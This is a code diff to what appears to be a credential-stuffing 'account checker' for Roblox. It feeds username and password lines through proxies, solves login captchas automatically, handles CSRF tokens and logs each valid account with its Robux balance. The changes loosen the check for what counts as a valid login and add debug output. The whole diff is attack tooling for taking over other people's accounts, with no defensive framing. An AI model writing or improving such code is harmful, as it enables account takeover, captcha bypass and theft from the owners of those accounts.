@@ -51,6 +51,8 @@ def update_stats(status):
         elif status == "invalid":
             stats["invalid"] += 1
         elif status == "captcha":
+            # Captcha solved = valid account
+            stats["valid"] += 1
             stats["captcha_solved"] += 1
         else:
             stats["errors"] += 1
@@ -113,15 +115,21 @@ def check_account_task(account_line, proxy_dict):
                 add_log(f"⚠️ Captcha detected but no CSRF token for {username}", "red")
                 return
 
-            solver = AdvancedCaptchaSolver(headless=True, debug=False)
+            solver = AdvancedCaptchaSolver(headless=True, debug=True)
+            console.print(f"[yellow]   ⚡ Starting captcha solver for {username}...[/yellow]")
+            
             solve_result = session.solve_captcha_and_retry(
                 username,
                 password,
                 csrf,
                 lambda u, p, t: solver.solve(u, p, t)
             )
+            
+            console.print(f"[dim]   Solve result: {solve_result}[/dim]")
+            console.print(f"[dim]   Session logged_in: {session.is_logged_in}[/dim]")
 
-            if solve_result.get('status') == 'success' and session.is_logged_in:
+            # Check for success - either direct success or VISUAL_SUCCESS means valid
+            if solve_result.get('status') == 'success' or (solve_result.get('status') != 'invalid' and session.is_logged_in):
                 # Get Info for captcha-solved accounts
                 info = session.get_account_info()
                 robux = info.get("robux", 0)
@@ -136,6 +144,7 @@ def check_account_task(account_line, proxy_dict):
                 
                 msg = f"✅ {username} | Robux: {robux}"
                 add_log(msg, "green")
+                console.print(f"[green]   ✅ {username} validated with {robux} Robux![/green]")
                 return
             elif solve_result.get('status') == 'invalid':
                 update_stats("invalid")
@@ -143,7 +152,7 @@ def check_account_task(account_line, proxy_dict):
                 return
             else:
                 update_stats("errors")
-                add_log(f"❌ {username}: Captcha failed", "red")
+                add_log(f"❌ {username}: Captcha failed - {solve_result.get('message', 'unknown')}", "red")
                 return
         else:
             update_stats("errors")
